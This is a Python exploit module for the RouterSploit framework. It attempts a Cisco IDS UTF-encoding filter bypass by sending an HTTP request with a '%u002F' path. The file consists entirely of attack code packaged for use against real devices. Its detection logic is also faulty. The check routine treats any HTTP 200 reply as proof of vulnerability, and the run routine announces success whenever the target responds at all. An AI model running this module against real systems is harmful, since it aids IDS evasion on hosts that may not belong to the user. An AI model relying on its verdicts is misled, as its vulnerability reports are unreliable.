import re

from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Cisco IDS UTF encoding bypass vulnerability
    """
    __info__ = {
        'name': 'Cisco IDS UTF encoding bypass',
        'description': 'Cisco IDS Device software contain a vulnerability, Attacker \n'
                       'can bypass IDS filter by send special HTTP request with UTF \n'
                       'encoding string.',
        'authors': [
            'BlackAngles',
        ],
        'references': [
            'http://www.securityfocus.com/bid/5976/info',
        ],
        'devices': [
            'Cisco IDS',
        ],
        'id': 'sf-4771-13',
    }
    target = exploits.Option('', 'Target HTTP address', validators=validators.url)
    port = exploits.Option(80, 'HTTP(s) server Port', validators=validators.integer)
    vuln = exploits.Option('%u002F', 'Vulnerable URI with UTF encode')

    def run(self):
        if self.check():
            print_success("Target seem to be exploited!")
            url = "{}:{}/{}".format(self.target, self.port, self.vuln)
            response = http_request(method="GET", url=url)
            if response is None:
                print_error("Target may not in suffer")  # target is not vulnerable
                return
            else:
                print_success("Exploit success! - Target is vulnerable!")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        """
        Check the server exist or not! (Connectivity check)
        :return:
        """
        for num in range(16, 100):
            url = "{}:{}".format(self.target, self.port)
            response = http_request(method="GET", url=url)
            if response is None:  # target does not respond
                break
            if response.status_code == 200:
                return True  # target is vulnerable

        return False  # target is not vulnerable
